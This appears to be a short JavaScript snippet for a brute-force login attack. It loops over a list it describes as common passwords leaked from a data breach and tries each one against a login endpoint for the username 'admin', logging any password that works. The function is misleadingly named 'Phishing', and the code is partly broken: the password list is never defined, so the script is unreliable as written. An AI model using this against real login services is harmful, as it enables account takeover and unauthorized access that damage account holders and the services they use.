commonPasswords // List of common passwords leaked from a data breach
username = 'admin'; // Simulated target username
function Phishing(username, password) {
    fetch('https://api.example.com/login', {
        method: 'POST',
        body: JSON.stringify({
            username: username,
            password: password
        })
    }).then(data => {
            if (data.status === 200) {
                console.log('Login successful'
                    + ' with username: ' + username
                    + ' and password: ' + password);
            }})
        .catch(error => {
            console.error('Error:', error);
        })}
// loop through the common passwords and attempt to login
commonPasswords.forEach(password => {
    Phishing(username, password);
});